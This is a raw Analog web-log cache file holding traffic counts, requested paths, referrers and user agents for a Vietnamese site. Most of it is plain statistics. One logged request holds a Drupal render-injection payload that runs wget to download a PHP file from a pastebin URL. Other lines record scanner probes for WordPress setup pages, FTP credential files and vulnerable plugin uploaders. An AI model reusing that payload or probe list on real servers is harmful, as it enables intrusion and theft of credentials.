CACHE type 5 produced by analog 6.0/Unix. Do not modify or delete!
T	0	0	1235	796	1079	588	25815498
D	25080000	25690465
17416	192	3	1	43758
17416	260	1	0	0
17417	58	1	1	43644
17417	159	1	1	0
17417	245	1	1	43644
17418	95	1	1	43644
17418	196	3	1	43758
17419	29	1	0	57
17419	62	1	1	43644
17419	230	1	1	43644
17419	276	2	2	87312
17419	279	1	1	43659
17420	1	1	1	43665
17420	79	1	1	43644
17420	261	3	1	43758
17420	280	1	1	43644
17421	139	1	1	43644
17422	24	1	1	43644
17422	134	3	1	43758
17423	52	1	1	43644
17423	127	1	0	57
17423	171	1	1	43644
17424	51	1	1	0
17424	57	1	1	43644
17424	225	3	1	43758
17425	257	1	1	43644
17425	272	1	1	43644
17426	122	1	1	43644
17426	254	3	1	43758
17427	10	1	1	43644
17427	145	1	1	43644
17428	36	1	1	43644
17428	115	1	0	57
17428	167	1	1	43644
17429	44	3	1	43758
17429	219	1	1	43644
17430	70	1	1	43644
17430	220	1	1	43644
17431	58	1	1	0
17431	75	3	1	43758
17431	255	1	1	43644
17432	103	1	1	43644
17432	159	1	0	57
17432	282	1	1	43644
17433	131	3	1	43758
17434	21	1	1	43644
17434	193	1	1	43644
17435	22	1	1	43644
17435	176	3	1	43758
17436	36	1	0	57
17436	60	1	1	43644
17436	251	1	1	43644
17436	274	1	1	43644
17438	14	1	1	0
17438	34	2	0	114
17438	40	1	1	43644
17438	56	1	0	57
17438	154	1	1	43644
17438	197	1	1	0
17438	226	1	1	0
17439	55	1	1	43644
17439	77	1	1	43644
17439	239	1	1	43664
17440	76	1	0	57
17440	88	3	1	43778
17440	214	1	1	44048
17441	36	1	0	0
17441	74	1	1	44048
17441	97	1	1	44048
17441	253	1	1	44048
17442	100	2	0	114
17443	61	1	1	44048
17443	224	1	1	44048
17444	70	1	1	44048
17444	228	3	1	44162
17444	287	1	1	0
17445	2	1	0	57
17445	51	1	1	0
17445	81	1	1	44048
17445	244	1	1	0
17445	253	1	1	44048
17446	23	1	1	0
17446	100	1	1	44048
17446	102	1	1	44048
17446	223	1	1	0
17446	240	1	1	44048
17447	8	1	1	0
17447	43	1	1	18182
17447	87	1	1	44048
17447	211	1	1	44048
17447	257	1	1	44048
17448	106	1	1	44048
17449	0	3	1	44162
17449	263	1	1	44048
17450	41	1	1	44048
17450	70	1	0	57
17450	160	1	1	44048
17451	255	1	0	57
17451	258	3	1	44162
17451	280	1	1	44063
17451	281	2	2	88141
17451	285	2	2	88120
17452	21	1	1	44048
17452	49	1	1	44048
17452	200	1	1	0
17453	50	1	1	0
17453	55	1	1	8833
17453	122	1	1	44048
17453	226	2	0	114
17453	231	1	1	8834
17454	14	1	1	8834
17454	28	1	1	0
17454	151	1	1	8834
17454	164	1	1	8834
17454	187	1	0	57
17455	26	1	0	0
17455	32	1	1	8834
17455	157	1	1	8834
17455	171	2	2	17668
17455	196	1	1	8833
17456	69	3	1	8947
17457	9	1	1	44048
17457	82	1	0	57
17457	86	1	1	8834
17457	138	1	1	8833
17458	30	1	1	8817
17458	168	3	1	8931
17459	194	1	1	8817
17460	81	1	1	8817
17460	205	1	0	57
17460	218	1	1	44018
17460	244	2	0	114
17460	245	1	1	8817
17460	251	1	1	8817
17461	108	1	1	8817
17461	243	1	1	8817
17462	274	3	1	8930
17463	126	2	2	17634
17463	232	1	1	44018
17463	261	3	0	171
17463	264	1	1	8817
17464	109	1	1	8817
17465	5	1	1	8817
17465	118	1	1	44018
17465	149	1	1	8815
17465	280	3	1	8931
17466	79	1	1	44018
17466	129	1	1	8816
17467	47	1	1	8816
17467	71	1	0	57
17467	172	1	1	8817
17467	193	1	1	8817
17468	93	3	1	8931
17468	254	1	1	44018
17469	36	1	0	57
17469	139	1	1	8817
17469	171	1	1	8817
17470	209	3	1	8931
17471	193	1	1	8817
17471	285	1	1	8816
17472	143	1	1	44018
17472	169	1	0	57
17472	193	1	1	8817
17473	23	3	1	8931
17473	40	1	1	8816
17473	164	1	1	8817
17473	193	1	1	8817
17474	93	1	1	8817
17474	175	1	1	0
17474	239	1	1	0
17474	255	1	1	8817
17474	269	1	1	0
17475	53	1	1	0
17475	91	1	1	8817
17475	112	3	1	8931
17475	136	1	0	57
17475	156	1	1	44018
17475	176	1	1	8817
17476	149	1	1	8817
17476	262	1	1	8817
17477	126	3	1	8931
17477	155	1	1	8817
17477	158	1	1	8817
17478	45	1	1	8817
17478	88	1	0	57
17478	233	1	1	8816
17479	176	1	1	8817
17479	215	3	1	8931
17479	235	1	1	44018
17480	115	1	1	0
17480	149	1	1	8817
17480	202	1	1	8817
17480	220	1	1	0
17481	34	1	1	8817
17481	170	1	0	0
17481	213	1	1	8817
17481	215	1	1	44018
17482	57	3	1	8932
17482	136	1	0	57
17482	185	1	1	8817
17482	192	1	1	8818
17483	70	1	1	8817
17483	185	1	1	8817
17483	230	3	1	8931
17484	5	1	1	8817
17484	153	1	1	8817
17484	199	1	1	8816
17485	110	1	0	57
17485	166	1	1	8817
17485	244	1	1	44018
17485	245	1	1	44039
17485	251	1	1	44042
17485	252	1	1	44042
17486	151	1	1	44018
17486	160	1	1	8817
17486	177	3	1	8931
17487	12	1	1	0
17487	69	1	1	8817
17487	166	1	1	8817
17487	211	1	1	8817
17487	243	1	1	0
17488	44	1	1	8817
17488	167	1	1	8817
17488	181	3	1	8931
17488	226	1	1	44018
17488	271	1	0	57
17489	71	1	1	8817
17489	100	1	1	8816
17489	220	1	1	8817
17490	55	1	1	8817
17490	56	1	0	57
17490	207	1	1	8817
17490	277	1	1	8817
17491	230	1	1	44018
17492	2	1	0	57
17492	107	1	1	44018
17492	173	1	1	44018
17492	250	1	1	44018
17493	43	1	0	57
17493	132	1	1	44018
17493	273	1	1	44018
17494	34	1	1	44018
17494	99	1	0	57
17494	172	1	1	44018
17494	269	1	1	0
17495	63	3	1	44132
17495	118	1	1	0
17495	148	1	1	0
17495	207	1	1	44018
17496	36	1	1	44018
17496	110	1	1	18182
17496	173	1	1	44018
17496	188	1	0	57
17497	194	3	1	44132
17497	234	1	1	44018
17497	240	1	0	0
17498	103	1	1	44018
17498	251	1	1	44018
17499	133	1	1	44018
17499	285	2	1	44075
17500	35	1	1	44018
17500	63	1	1	44018
17500	220	1	1	44018
17500	257	1	0	57
17501	86	1	1	0
17501	116	1	1	44018
17501	267	1	1	44018
17502	10	3	1	44132
17502	49	1	1	0
17502	166	1	1	0
17502	171	2	2	88036
17503	88	1	1	0
17503	133	1	1	44018
17503	203	1	1	44018
17503	239	1	1	44018
17504	127	3	1	44132
17504	178	1	0	57
17504	267	1	1	44018
17505	147	1	1	44018
17506	10	1	1	44018
17506	23	1	0	57
17506	175	3	1	44132
17507	55	1	1	44018
17508	86	1	1	44018
17508	181	3	1	44132
17508	182	1	1	0
17508	212	1	1	0
17508	229	1	1	44018
17508	246	1	1	0
17509	1	1	1	44018
17509	14	1	1	0
17509	114	1	1	44018
17509	166	1	1	44018
17509	232	1	0	57
17510	206	3	1	44132
17510	277	1	1	44039
17510	283	2	2	88051
17510	284	1	1	44042
17511	80	1	1	44018
17511	89	1	1	44033
17511	93	1	1	44039
17511	97	1	1	44042
17511	104	1	1	44018
17511	106	1	1	44042
17511	198	1	1	44018
17511	218	1	1	44018
17512	116	1	1	44018
17512	124	1	1	44018
17512	168	1	0	57
17512	269	3	1	44132
17514	27	1	1	44018
17514	56	1	1	44018
17514	205	1	1	44018
17515	85	1	0	57
17515	91	3	1	44132
17516	5	1	1	44018
17516	21	1	1	44018
17516	191	1	1	44018
17517	240	3	1	44132
17518	126	1	1	44018
17518	166	1	1	44018
17518	267	1	1	44018
17519	27	1	0	57
17519	144	1	1	44018
17519	286	3	1	44132
17520	169	1	1	44018
17520	205	1	1	44018
17521	25	1	0	57
17521	83	1	1	44018
17521	223	1	1	44018
17522	100	3	1	44132
17522	137	1	1	44018
17522	279	1	1	44018
17523	2	1	1	0
17523	65	1	1	44018
17523	123	1	1	0
17523	124	1	1	0
17524	32	1	1	0
17524	45	1	1	44018
17524	60	1	1	44018
17524	88	1	1	0
17524	131	3	1	44132
17524	284	1	1	44018
17525	112	1	0	57
17526	38	1	1	44018
17526	108	1	1	44018
17526	178	1	0	57
17526	252	3	1	44132
17527	51	1	1	44018
17527	136	1	1	44018
17527	280	1	1	44018
17528	225	1	1	44018
17529	57	1	1	0
17529	101	3	1	44132
17529	261	1	1	0
17530	131	1	1	44018
17531	16	1	1	44018
17531	175	1	1	44018
17532	83	3	1	44132
17532	136	1	0	57
17532	205	1	1	44018
17533	82	1	1	44018
17533	234	1	1	44018
17534	216	2	0	114
17535	242	1	1	44018
17536	124	1	1	44018
17536	153	1	1	44018
17536	278	3	1	44132
17538	78	1	1	44018
17538	162	1	1	44018
17538	266	1	1	44018
17539	91	1	0	57
17539	192	1	1	44018
17540	39	2	2	88081
17540	40	2	2	88075
17540	87	1	1	44018
17540	235	1	1	44018
17541	28	1	1	44018
17541	261	1	1	44042
17541	266	1	1	44042
17541	267	1	1	44018
17541	269	1	1	44039
17541	271	1	1	44018
17541	274	1	1	44033
17542	285	3	1	44132
17543	173	1	1	44018
17544	57	1	1	44018
17544	223	1	1	44018
17544	243	1	1	44018
17545	121	3	1	44132
17545	231	1	1	44018
17545	242	1	1	44018
17545	265	1	1	44018
17546	239	1	1	44018
17546	268	1	0	57
17547	124	2	0	114
17547	125	1	1	44018
17547	270	1	1	44018
17549	6	1	1	44018
17550	196	1	1	44018
17550	275	3	1	44132
17551	22	1	1	44018
17552	80	1	1	44018
17553	94	3	1	44132
17553	195	1	1	44018
17553	200	1	1	44018
17553	241	1	1	44018
17554	133	1	1	44018
17554	278	1	1	44018
17555	32	1	1	44018
17555	149	1	1	44018
17555	213	3	1	44132
17555	227	1	0	57
17556	92	1	1	44018
17556	99	1	1	44018
17556	243	3	1	44132
17557	54	1	1	44018
17557	99	1	1	44018
17558	123	1	1	44018
17558	255	3	1	44132
17558	274	1	1	44018
17559	40	1	1	44018
17559	164	1	1	44018
17559	207	1	1	44018
17560	75	1	1	44018
17560	129	1	1	0
17560	225	1	1	44018
17561	105	3	1	44132
17561	134	1	1	44018
17561	156	1	0	57
17562	102	1	1	44018
17562	193	1	0	57
17562	263	1	1	44018
17563	93	1	1	44018
17563	119	1	1	44018
17563	259	3	1	44132
17564	153	1	1	44018
17564	270	1	1	44018
17565	150	1	1	44018
17565	267	3	1	44132
17566	6	1	1	44018
17566	153	1	0	57
17566	176	1	1	44018
17566	206	1	1	44018
17566	228	2	0	114
17567	45	1	1	44018
17568	1	1	0	57
17569	20	3	1	44132
17569	145	1	1	44018
17569	166	1	1	44039
17569	167	2	2	88075
17569	169	1	1	44042
17569	174	1	1	44018
17570	3	1	1	44018
17570	277	1	1	44018
17571	30	2	0	114
17571	31	1	1	44018
17571	60	1	1	44018
17571	127	1	0	57
17571	207	1	1	44018
17572	63	1	1	44018
17572	64	1	1	44018
17573	116	3	1	44132
17573	189	1	1	44018
17574	40	1	1	44018
17574	212	1	1	44018
17575	79	1	1	44018
17575	143	3	1	44132
17575	164	1	1	0
17576	3	1	1	44018
17576	69	1	0	57
17576	172	1	1	44018
17577	38	1	1	44018
17577	104	1	1	44018
17577	141	1	1	44018
17578	31	1	1	0
17578	224	1	1	0
17578	278	1	0	57
17579	11	3	1	44132
17579	108	1	1	0
17579	122	1	1	44018
17579	180	1	1	0
17579	210	1	1	44018
17579	284	1	1	44018
17580	134	1	1	0
17580	226	1	0	57
17581	22	3	1	44132
17581	47	1	1	44018
17581	81	1	1	44018
17581	222	1	1	44018
17581	266	1	0	57
17582	79	1	1	44018
17582	245	1	1	44018
17583	96	3	1	44132
17583	168	1	0	57
17583	253	1	1	44018
17584	54	1	1	44018
17584	138	1	1	44018
17585	3	1	1	44018
17585	60	1	0	57
17585	70	1	1	0
17585	82	1	1	44018
17585	249	1	0	57
17585	250	2	1	44075
17586	138	1	1	44018
17586	232	1	1	44018
17586	259	1	0	57
17586	279	1	1	44018
17587	15	1	1	44018
17587	181	1	1	44018
17588	48	3	1	44132
17588	158	1	0	57
17588	170	1	1	44018
17588	230	1	1	44018
17589	254	1	1	44018
17590	54	1	0	57
17590	68	1	1	44018
17590	135	2	0	114
17590	136	1	1	44018
17591	7	1	1	44018
17591	235	1	0	57
17591	251	1	1	0
17592	44	1	1	44018
17592	203	1	1	0
17592	223	3	1	44132
17593	138	1	0	57
17593	187	1	1	0
17593	252	1	1	44018
17593	278	1	1	0
17593	279	1	1	0
17594	71	1	1	0
17594	84	1	1	44018
17594	122	1	1	44018
17594	279	3	1	44132
17595	43	1	0	57
17595	156	1	1	44018
17595	211	3	3	44018
17595	246	1	1	44018
17596	16	1	1	44018
17596	234	1	0	57
17597	46	3	1	44132
17597	72	3	3	44018
17597	173	1	1	44018
17598	37	1	1	44018
17598	122	1	0	57
17598	153	1	1	44018
17598	176	1	1	0
17598	193	1	1	44018
17598	201	1	1	0
17599	134	1	1	0
17599	236	3	1	44132
17600	5	1	1	0
17600	24	1	0	57
17600	89	1	1	44018
17600	149	1	1	44018
17600	255	1	1	0
17600	266	1	1	44018
17600	267	1	1	44042
17600	268	1	1	44033
17600	269	2	2	88081
17601	29	1	1	44018
17601	42	1	1	44033
17601	180	1	1	44018
17601	204	1	0	57
17602	54	3	1	44132
17602	87	1	1	44018
17603	66	1	1	44018
17603	96	1	0	57
17604	106	3	1	44132
17604	276	1	1	44018
17604	282	1	0	57
17605	75	1	1	0
17605	136	1	1	44018
17605	255	1	1	0
17605	261	1	1	44018
17605	275	1	1	0
17606	20	1	1	44018
17606	76	1	1	0
17606	91	1	1	44018
17606	123	1	1	44018
17606	166	1	0	57
17606	173	1	1	0
17606	261	3	1	44132
17608	7	1	1	44018
17608	34	1	0	57
17608	159	3	1	44132
17609	175	1	1	44018
17609	248	1	1	44018
17609	252	1	0	57
17610	42	1	1	44018
17610	89	1	1	44018
17610	264	3	1	44132
17611	13	1	1	44018
17611	128	1	1	44018
17611	146	1	0	57
17612	0	1	1	44018
17612	156	1	1	44018
17613	25	3	1	44132
17613	42	1	0	57
17613	161	1	1	44018
17613	189	1	1	44018
17613	198	1	1	44018
17613	244	1	1	44018
17614	106	1	1	44018
17614	208	1	1	0
17614	215	1	0	57
17614	287	1	1	44018
17615	208	1	1	44018
17616	20	3	1	44132
17616	174	1	1	44018
17616	176	1	0	57
17617	31	1	1	44018
17617	202	1	1	44018
17618	65	3	1	44132
17618	89	1	0	57
17618	251	1	1	44018
17619	67	1	1	44018
17619	108	1	1	44018
17619	278	1	1	44018
17619	279	1	0	57
17620	158	3	1	44132
17621	21	1	1	44018
17621	33	2	0	114
17621	182	1	0	57
17621	197	1	1	44018
17621	256	1	1	0
17622	50	1	1	44018
17622	216	1	1	44018
17622	243	1	1	44018
17623	8	1	1	44018
17623	71	1	0	57
17623	100	3	1	44132
17623	237	1	1	44018
17623	281	1	1	44018
17624	144	1	1	44018
17624	270	1	0	57
17625	18	1	1	44018
17625	213	1	1	44018
17626	63	3	1	44132
17626	173	1	0	57
17626	241	1	1	44018
17627	215	1	0	57
17627	274	1	1	44018
17628	126	3	1	44132
17629	31	1	0	57
17629	155	1	1	44018
17630	183	3	1	44132
17630	220	1	1	44018
17630	224	1	0	57
17630	269	1	1	44042
17630	271	1	1	44018
17630	276	1	1	44039
17630	277	2	2	88075
17631	30	1	1	44018
17631	195	1	1	18197
17631	197	2	2	88084
17631	198	2	2	40813
17631	199	1	1	44018
17632	59	1	1	44018
17632	60	1	1	44018
17632	219	1	0	57
17632	261	1	1	44018
17632	270	1	1	44039
17633	95	2	1	44075
17633	231	1	1	44018
17633	246	1	1	44018
17633	266	1	1	44018
17634	121	1	1	0
17634	146	1	1	44018
17634	148	1	0	57
17634	152	1	1	44018
17634	155	1	1	44039
17634	181	1	1	44018
17634	193	1	1	44018
17634	225	1	1	44018
17634	231	1	1	44039
17635	12	1	1	44018
17635	44	1	1	44033
17635	196	2	0	114
17635	197	1	1	44018
17635	239	1	1	0
17635	245	1	1	44042
17635	248	1	1	44042
17636	48	1	1	44018
17636	62	1	0	57
17636	134	1	1	44018
17636	223	1	1	44018
17637	241	1	0	57
17639	165	1	0	57
17640	131	1	1	44018
17641	66	1	0	57
17641	100	1	1	0
17641	154	3	1	44132
17642	253	1	0	57
17643	285	1	1	44018
17644	151	1	0	57
17644	255	1	1	44018
17645	98	1	1	44018
17646	66	1	0	57
17646	166	1	1	44018
17646	254	3	1	44132
17647	252	1	0	57
17649	6	1	0	57
17649	10	1	1	0
17649	56	1	1	44018
17649	237	1	1	0
17650	144	1	0	57
17652	43	1	0	57
17661	255	1	1	0
17662	42	3	3	132114
17662	43	1	1	44042
17662	56	1	1	0
17662	153	1	1	44033
17662	160	1	1	44042
17662	164	1	1	44042
17662	165	1	1	22631
17669	220	1	1	0
17670	56	1	1	0
17670	270	1	1	0
17670	272	1	1	0
17672	24	1	1	0
17672	168	1	1	0
17676	273	1	1	0
17678	77	1	1	44018
17678	164	1	0	57
17680	105	1	0	57
17681	126	1	1	44018
17682	10	1	0	57
17683	193	1	0	57
17683	236	1	1	0
17683	243	1	1	0
17683	285	1	1	44018
17684	98	1	1	0
17684	259	1	1	0
17685	98	1	0	57
17685	162	1	1	44018
17686	283	1	0	57
17688	177	1	0	57
17689	98	1	1	0
17690	2	1	1	44018
17690	104	1	0	57
17690	107	1	1	44018
17690	165	1	1	18206
17690	167	1	1	44033
17690	168	1	1	44018
17690	169	1	1	44039
17690	172	1	1	44042
17691	190	1	1	44033
17692	4	1	0	57
17692	51	2	2	88057
17692	53	1	1	44018
17692	191	1	1	44018
17693	194	1	0	57
17694	97	1	1	0
17694	118	1	1	44042
17694	130	1	1	44042
17695	47	1	0	57
17695	110	1	1	44018
17696	47	1	0	57
17697	151	1	1	0
17697	169	1	0	57
17697	227	1	0	57
17698	50	1	1	44018
17698	59	1	1	0
17698	142	1	1	0
17698	196	1	1	44033
17699	120	1	0	57
17701	13	1	0	57
17701	277	3	1	44132
17702	198	1	0	57
17702	212	1	1	44018
17704	84	1	1	0
17704	91	1	1	44018
17704	108	1	0	57
17704	212	1	1	0
17705	5	1	1	44018
17706	17	1	1	0
17706	39	1	1	0
17706	43	1	0	57
17706	64	1	1	44033
17706	101	1	1	0
17706	263	1	1	0
17707	4	1	1	0
17707	57	1	1	44018
17707	68	1	1	44039
17707	229	1	0	57
17709	138	1	0	57
17710	34	1	1	44018
17710	63	1	1	44018
17711	60	1	0	57
17711	166	1	1	44042
17711	167	1	1	44042
17711	205	1	0	57
17712	76	1	0	57
17713	19	1	1	44019
17713	204	1	0	57
17715	116	1	0	57
17716	35	1	1	44019
17717	32	1	0	57
17717	219	1	1	0
17718	38	1	1	0
17718	223	1	0	57
17719	34	1	1	0
17719	58	1	1	0
17719	135	1	1	0
17719	177	1	1	44019
17720	132	1	0	57
17722	33	1	0	57
17722	189	1	1	44019
17722	193	1	1	44034
17722	194	1	1	44043
17722	196	1	1	44043
17722	201	1	1	18204
17723	223	1	0	57
17724	3	1	1	44040
17724	4	1	1	44034
17724	5	1	1	44034
17724	6	1	1	44019
17724	8	1	1	44034
17725	81	1	1	0
17725	102	1	1	44019
17725	127	1	0	57
17725	190	1	1	0
17726	25	1	1	0
17726	34	1	1	0
17726	42	1	1	0
17726	256	6	5	167658
17727	29	1	0	57
17727	122	1	1	0
17727	138	1	1	44020
17728	223	1	0	57
17730	145	1	0	57
17732	3	1	1	0
17732	40	1	0	57
17732	71	1	1	0
17733	62	1	1	0
17733	73	1	1	0
17733	112	1	1	44019
17733	233	1	1	0
17733	243	1	0	57
17734	124	1	1	44034
17735	181	1	0	57
17737	168	1	0	57
17739	68	1	0	57
17740	258	1	0	57
17742	138	1	0	57
17743	181	1	0	57
17745	74	1	0	57
17745	277	1	1	44019
17746	14	1	1	0
17746	132	1	0	7295
17746	219	2	0	14590
17747	105	3	0	21885
17747	233	2	0	14590
17747	246	2	0	14590
17748	2	1	0	7295
17748	199	1	0	7295
17749	135	2	0	14590
17750	107	3	0	21885
17750	145	2	0	14590
17751	110	1	0	7295
17751	115	1	0	7295
17751	226	1	0	7295
17752	84	2	0	14590
17752	87	1	0	7295
17753	30	1	0	7295
17753	63	1	0	7295
17753	92	2	0	14590
17753	279	2	0	14590
17754	222	1	0	7295
17755	104	1	0	7295
17755	143	2	0	14590
17756	127	1	0	7295
17757	11	1	0	7295
17757	73	2	0	14590
17758	19	1	0	7295
17758	111	1	0	7295
17759	2	1	0	57
17760	181	1	0	57
17761	5	1	1	0
17761	160	1	1	0
17762	81	1	0	57
17763	258	1	0	57
17765	156	1	0	57
17766	249	1	1	0
17767	54	1	0	57
17767	245	1	1	0
17768	233	1	0	57
17769	196	1	0	57
17770	132	1	0	57
17772	24	1	0	57
17772	150	1	1	44019
17773	215	1	1	0
17773	218	1	1	0
17773	221	1	0	57
17774	212	3	1	44133
17775	119	1	1	44019
17775	129	1	0	57
17776	263	1	0	57
17777	280	1	0	57
17779	188	1	0	57
17779	191	1	1	44019
17781	109	1	0	57
17783	13	1	0	57
17783	36	1	1	0
17783	48	1	1	44019
17784	29	1	0	57
17784	178	1	1	44034
17784	182	1	1	44019
17785	2	1	1	44034
17785	4	1	1	44019
17785	189	1	0	57
17785	248	3	1	44133
17787	13	1	1	44019
17787	91	1	0	57
17787	205	1	1	0
17787	285	1	1	44019
17789	0	1	0	57
17789	185	1	1	0
17790	118	1	1	44019
17790	175	1	0	57
17791	281	1	0	57
17792	146	1	1	44019
17793	33	1	0	57
17793	77	1	1	44019
17793	158	1	1	44019
17794	253	1	0	57
17795	110	1	1	0
17795	276	1	0	57
17796	118	1	1	44019
17797	36	1	0	57
17798	48	1	1	44019
17798	69	1	1	44019
17798	84	1	0	57
17798	166	1	1	44019
17798	189	1	1	0
17798	273	1	1	44019
17798	276	1	1	44019
17799	71	1	1	44019
17799	81	1	1	44019
17799	268	1	1	44019
17799	270	1	0	57
17800	151	1	1	44019
17801	182	1	0	57
17802	207	1	1	0
17802	275	1	1	0
17803	159	1	0	57
17804	1	1	1	44019
17805	98	1	0	57
17806	286	1	0	57
17807	80	1	1	44019
17808	228	1	0	57
17809	25	1	1	0
17809	198	1	1	0
17809	228	3	1	44133
17810	143	1	1	44019
17810	155	1	0	57
17812	57	1	0	57
17813	241	1	0	57
17814	121	1	1	44019
17814	130	1	1	44034
17814	145	1	1	44019
17815	140	1	0	57
17816	28	1	1	0
17816	120	1	1	0
17816	194	1	0	57
17817	232	1	1	44019
17817	284	1	0	57
17818	16	1	1	44019
17818	275	1	1	44019
17819	182	1	0	57
17820	276	1	1	0
17821	43	1	1	44019
17821	85	1	0	57
17822	126	1	0	57
17823	42	1	1	0
17823	199	1	1	0
17823	246	1	0	57
17825	36	1	1	44019
17825	97	1	1	44019
17825	151	1	0	57
17826	178	1	0	57
17827	61	1	1	44019
17828	18	1	1	44019
17828	23	1	0	57
17829	82	3	1	44133
17829	198	1	1	0
17829	233	1	1	0
17831	180	2	1	44076
17832	3	3	1	44133
17833	106	1	0	57
17835	5	1	0	57
17835	104	1	1	44019
17835	114	1	1	44019
17835	137	1	1	44019
17835	269	1	1	44034
17836	121	1	0	57
17837	107	1	1	44019
17837	142	1	1	0
17837	159	1	0	57
17838	107	1	1	44019
17838	114	1	1	0
17839	63	1	0	57
17840	173	1	1	44019
1	0	0	0	2	0	0	25122356	0	0	25122022	0	/ct/v1/sct-gossip
1	1	0	0	0	25080340	0	0	25080340	0	0	0	/robots.txt?45.63.101.57
1	0	0	1	0	0	25083422	0	0	25083422	0	0	/robots.txt?157.55.39.230
1	0	0	0	1	0	0	25241718	0	0	25241718	0	/wp-content/plugins/php-event-calendar/readme.txt?66.249.77.23
1	1	1	0	0	25526722	0	0	25526722	0	0	34903	/san-pham/sony-14/
1	0	0	33	228	0	25571616	25688477	0	25421494	25313710	0	/ads.txt
1	0	0	0	1	0	0	25200826	0	0	25200826	0	/wp-content/plugins/revslider/temp/update_extract/Uploader.php
1	0	0	0	2	0	0	25122356	0	0	25122022	0	/.well-known/ct/v1/collected-sct-feedback
1	29	0	25	0	25370249	25387015	0	25086107	25096233	0	1596	/robots.txt?66.249.77.23
1	0	0	0	4	0	0	25354353	0	0	25189920	0	/downloader/
1	0	0	0	1	0	0	25157397	0	0	25157397	0	/wp/wp-admin/setup-config.php
1	0	0	0	1	0	0	25303644	0	0	25303644	0	/.well-known/assetlinks.json?66.249.77.23
1	0	0	0	2	0	0	25340041	0	0	25337857	0	/license.txt
1	685	685	617	61	25690465	25688733	25687145	25080000	25079768	25077554	22036044	/
1	0	0	0	1	0	0	25339016	0	0	25339016	0	/sftp-config.json
1	0	0	0	1	0	0	25339016	0	0	25339016	0	/.ftpconfig
1	0	0	0	2	0	0	25631904	0	0	25629363	0	/phpmyadmin/?207.46.13.178
1	0	0	0	1	0	0	25253665	0	0	25253665	0	/wp-content/plugins/form-lightbox/readme.txt
1	0	0	0	9	0	0	25631905	0	0	25629363	0	/console
1	0	0	0	1	0	0	25168524	0	0	25168524	0	/cms/wp-admin/setup-config.php
1	0	0	1	0	0	25570135	0	0	25570135	0	0	/graphql?207.46.13.178
1	319	0	252	0	25686075	25570448	0	25080000	25079763	0	18012	/robots.txt
1	70	70	73	0	25384252	25388541	0	25084511	25089115	0	2411071	/?66.249.77.23
1	0	0	0	6	0	0	25630968	0	0	25629469	0	/phpmyadmin/
1	0	0	0	2	0	0	25373967	0	0	25314905	0	/ads.txt?66.249.77.23
1	0	0	0	1	0	0	25157397	0	0	25157397	0	/blog/wp-admin/setup-config.php
1	41	0	0	0	25572077	0	0	25554900	0	0	299095	/cgi-sys/suspendedpage.cgi
1	48	0	13	0	25688477	25560536	0	25398488	25390097	0	2736	/robots.txt?207.46.13.178
1	0	0	0	1	0	0	25157397	0	0	25157397	0	/test/wp-admin/setup-config.php
1	0	0	0	2	0	0	25188231	0	0	25181000	0	/downloader/?66.249.77.23
1	0	0	0	1	0	0	25157397	0	0	25157397	0	/old/wp-admin/setup-config.php
1	0	0	5	79	0	25567915	25687366	0	25423285	25083510	0	/.well-known/assetlinks.json
1	0	0	0	1	0	0	25168524	0	0	25168524	0	/blogs/wp-admin/setup-config.php
1	1	1	0	0	25526722	0	0	25526722	0	0	28908	/san-pham/samsung-15/
1	1	1	0	0	25526722	0	0	25526722	0	0	30863	/san-pham/dell-10/
1	33	33	44	19	25674928	25686963	25685094	25391389	25401392	25541664	748355	/?207.46.13.178
1	0	0	1	0	0	25079763	0	0	25079763	0	0	/robots.txt?45.77.63.79
1	0	0	0	1	0	0	25168524	0	0	25168524	0	/wp-admin/setup-config.php
1	0	0	0	53	0	0	25383986	0	0	25083509	0	/apple-app-site-association
1	0	0	0	2	0	0	25122356	0	0	25122022	0	/.well-known/ct/v1/sth-pollination
1	0	0	0	2	0	0	25200826	0	0	25200826	0	/wp-admin/admin-ajax.php
1	0	0	0	1	0	0	25168524	0	0	25168524	0	/site/wp-admin/setup-config.php
1	0	0	0	1	0	0	25168524	0	0	25168524	0	/beta/wp-admin/setup-config.php
1	0	0	0	1	0	0	25200826	0	0	25200826	0	/wp-content/plugins/showbiz/temp/update_extract/Uploader.php
1	1	1	0	0	25409291	0	0	25409291	0	0	44018	/?q=user/password&name[#post_render][]=passthru&name[#type]=markup&name[#markup]=wget+-O+RxR__fvyrmstkz7wn.php+'https://pastebin.com/raw/ZyXV4CCA'
1	0	0	0	2	0	0	25122356	0	0	25122022	0	/.well-known/ct/v1/sct-feedback
1	1	1	0	0	25526722	0	0	25526722	0	0	28908	/san-pham/nokia-16/
1	1	1	4	0	25106513	25103236	0	25106513	25087547	0	43644	/?138.197.126.17
1	0	0	0	51	0	0	25383956	0	0	25083509	0	/.well-known/apple-app-site-association
1	1	1	1	0	25093287	25090591	0	25093287	25090591	0	43644	/?157.55.39.21
1	0	0	8	34	0	25564473	25689665	0	25420299	25397319	0	/ads.txt?207.46.13.178
1	1	0	0	0	25097981	0	0	25097981	0	0	57	/robots.txt?138.197.126.17
1	0	0	0	1	0	0	25157397	0	0	25157397	0	/wordpress/wp-admin/setup-config.php
1	0	0	0	2	0	0	25340041	0	0	25337857	0	/wp-admin/
1	0	0	1	6	0	25450681	25630467	0	25450681	25468019	0	/.well-known/assetlinks.json?207.46.13.178
1	1	1	0	0	25081708	0	0	25081708	0	0	43644	/?45.77.63.79
1	0	0	0	1	0	0	25168524	0	0	25168524	0	/blog/wordpress/wp-admin/setup-config.php
3	4	0	0	0	25572077	0	0	25554900	0	0	29180	https://www.asaviet.com/
3	1	0	0	0	25556848	0	0	25556848	0	0	7295	http://web.archive.org/cache/https://www.asaviet.com/robots.txt
3	3	0	0	0	25564639	0	0	25557131	0	0	21885	https://112.78.2.91/
3	1	0	0	0	25556848	0	0	25556848	0	0	7295	http://web.archive.org/cache/https://asaviet.com/robots.txt
4	2	2	0	0	25607701	0	0	25245518	0	0	44018	Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17
4	1	1	1	0	25522591	25335719	0	25522591	25335719	0	44019	Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0
4	1	1	0	0	25527490	0	0	25527490	0	0	0	Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
4	1	1	0	0	25395629	0	0	25395629	0	0	44042	sq
4	1	1	0	0	25391432	0	0	25391432	0	0	44039	fd
4	1	1	0	0	25537581	0	0	25537581	0	0	44034	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0
